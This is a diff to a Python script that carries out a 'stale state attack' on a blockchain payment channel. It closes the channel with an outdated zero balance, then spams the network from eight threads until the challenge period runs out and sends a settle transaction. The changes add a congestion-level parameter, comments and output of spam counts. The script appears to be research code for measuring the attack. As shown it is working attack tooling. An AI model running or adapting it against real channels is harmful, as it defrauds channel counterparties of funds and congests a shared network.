@@ -17,12 +17,15 @@ from web3 import Web3, HTTPProvider
 from spamming import SpamManager
 import logging, click, datetime
 
-def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY):
+def cheat_and_spam(channel, private_key: str=config.PRIVATE_KEY, congestion_level: int=config.CONGESTION_LEVEL):
     '''
     Performs a stale state attack on the given channel. 
     Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
-    and spams the network with the given number {number_txs} of transactions from 
-    the account with the given {private_key}.
+    and spams the network with transactions from the account with the given {private_key}
+    until the channel is settled or the challenge period is over. If the end of the challenge
+    period is reached, a settle request is sent.
+    The parameter {congestion_level} defines the minimum number of pending blocks during the
+    spamming period.
     '''
     # Create close channel transaction
     close_tx = create_close_channel_transaction(channel=channel, balance=0)
@@ -31,13 +34,13 @@ def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY):
     logging.info('Sending close transaction...')
     channel.core.web3.eth.sendRawTransaction(close_tx)
 
-    # Start transaction spamming
+    # Start transaction spamming with 8 threads
     spam_manager = SpamManager(
         web3=channel.core.web3,
-        private_key=config.PRIVATE_KEY,
+        private_key=private_key,
         number_threads=8,
         nonce_offset=1,
-        min_pending_txs=config.MIN_PENDING_TXS,
+        congestion_level=congestion_level,
         callback=lambda nonce: send_settle(channel, nonce),
     )
     spam_manager.start()
@@ -57,15 +60,19 @@ def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY):
     settled_event = wait_for_settle(channel)
     logging.info('Channel settled at block #{}'.format(settled_event['blockNumber']))
 
+    # Stop the spamming
     spam_manager.stop()
 
+    # Get the settle transaction
     settle_tx_hash = settled_event['transactionHash']
     settle_tx = channel.core.web3.eth.getTransaction(settle_tx_hash)
 
+    # Extract some interesting information
     close_block = channel.core.web3.eth.getBlock(closed_event['blockNumber'])
     settle_block = channel.core.web3.eth.getBlock(settled_event['blockNumber'])
     elapsed_time = datetime.timedelta(seconds=settle_block['timestamp']-close_block['timestamp']) 
 
+    # Determine, if sender or receiver settled the channel
     settled_by = settle_tx['from']
     if (settled_by == channel.receiver):
         settled_by = 'Receiver'
@@ -81,15 +88,18 @@ def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY):
     # print('CLOSED block \t #{}'.format(closed_event['blockNumber']))
     # print('SETTLED block \t #{}'.format(settled_event['blockNumber']))
     print()
-    # print('Spam transactions \t {}'.format(number_txs))
     print('Settled by \t {}'.format(settled_by))
     print('Settle balance \t {}'.format(settled_event['args']['_balance']))
+    print('Spam transactions \t {}'.format(spam_manager.number_sent_transactions()))
     print('Elapsed time \t {}'.format(str(elapsed_time)))
     print('CLOSE->SETTLE \t {}'.format(settled_event['blockNumber']-closed_event['blockNumber']))
     print('-----------------------------------------------------------')
     print()
 
 def send_settle(channel, nonce):
+    '''
+    Send a settle request for the given channel with the given nonce value.
+    '''
     settle_tx = create_settle_channel_transaction(channel, nonce)
     channel.core.web3.eth.sendRawTransaction(settle_tx)
     logging.info('Sent settle transaction')
@@ -121,7 +131,7 @@ def main(rpcport: int):
     send_payment(channel=channel, amount=amount)
 
     # Start stale state attack
-    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY)
+    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY, congestion_level=config.CONGESTION_LEVEL)
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.INFO)
